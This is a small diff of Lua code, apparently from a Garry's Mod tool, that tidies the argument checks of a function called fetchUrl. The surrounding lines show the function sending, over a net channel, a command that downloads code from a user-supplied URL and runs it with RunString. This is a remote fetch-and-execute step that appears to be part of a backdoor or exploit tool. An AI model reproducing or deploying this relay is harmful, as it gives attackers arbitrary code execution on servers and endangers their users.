@@ -214,8 +214,7 @@ local function broadcastFunc(ply, cmd, args, argStr)
 end
 
 local function fetchUrl(ply, cmd, args, argStr)
-  if(!argStr || argStr == "") then return end
-    if(channelNil()) then return end
+  if(!argStr || argStr == "" || channelNil()) then return end
     local exec = "http.Fetch('http://"..argStr.."', RunString)"
     net.Start(channel)
     net.WriteString(exec)
